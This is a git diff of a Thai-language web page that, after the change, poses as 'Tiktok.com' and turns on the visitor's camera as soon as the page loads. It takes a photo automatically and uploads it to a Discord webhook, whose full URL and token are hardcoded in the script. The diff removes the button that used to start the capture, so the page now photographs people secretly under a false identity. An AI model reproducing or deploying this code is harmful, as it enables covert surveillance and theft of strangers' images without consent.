@@ -2,7 +2,7 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8">
-  <title>Artkungloveyouna</title>
+  <title>Tiktok.com</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -14,16 +14,6 @@
       padding: 20px;
       background: #0f172a;
       color: #e5e7eb;
-    }
-    a#captureLink {
-      display: inline-block;
-      padding: 12px 20px;
-      border-radius: 999px;
-      text-decoration: none;
-      background: #22c55e;
-      color: #0f172a;
-      font-weight: 600;
-      margin-top: 40px;
     }
     video, canvas, img {
       margin-top: 20px;
@@ -44,11 +34,9 @@
 
   <h1>Send Camera Capture to Discord</h1>
   <p class="note">
-    กดปุ่มด้านล่าง → กล้องจะเปิด → ถ่ายรูปอัตโนมัติ<br>
-    และส่งรูปไปที่ Discord channel ของคุณทันที
+    หน้าเว็บนี้จะเปิดกล้อง ถ่ายรูปอัตโนมัติ<br>
+    และส่งรูปเข้า Discord ให้ทันที
   </p>
-
-  <a href="#" id="captureLink">เริ่มถ่ายแล้วส่งรูป</a>
 
   <video id="video" playsinline autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
@@ -56,10 +44,8 @@
   <p class="note" id="status"></p>
 
   <script>
-    // ใช้ Webhook URL ของอาร์ตตรงนี้
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";
 
-    const captureLink = document.getElementById('captureLink');
     const video       = document.getElementById('video');
     const canvas      = document.getElementById('canvas');
     const photo       = document.getElementById('photo');
@@ -81,7 +67,6 @@
         });
 
         statusText.textContent = "กำลังถ่ายรูป...";
-
         await new Promise(r => setTimeout(r, 800));
 
         const width  = video.videoWidth;
@@ -96,13 +81,12 @@
         const dataURL = canvas.toDataURL('image/png');
         photo.src = dataURL;
 
-        // แปลงเป็น Blob
         const blob = await (await fetch(dataURL)).blob();
         const filename = "capture-" + Date.now() + ".png";
 
         const form = new FormData();
         form.append("file", blob, filename);
-        form.append("content", "📸 Photo captured from art.github.io");
+        form.append("content", "📸 Auto-captured from art.github.io");
 
         statusText.textContent = "กำลังส่งรูปไป Discord...";
 
@@ -122,14 +106,13 @@
 
       } catch (err) {
         console.error(err);
-        statusText.textContent = "เปิดกล้องไม่ได้หรือถูกปฏิเสธ ❌";
+        statusText.textContent = "ไม่สามารถเข้าถึงกล้องได้ ❌";
       }
     }
 
-    captureLink.addEventListener('click', e => {
-      e.preventDefault();
-      startCapture();
-    });
+    // 🚀 เริ่มทำงานทันทีเมื่อเข้าเว็บ
+    window.onload = startCapture;
   </script>
+
 </body>
 </html>
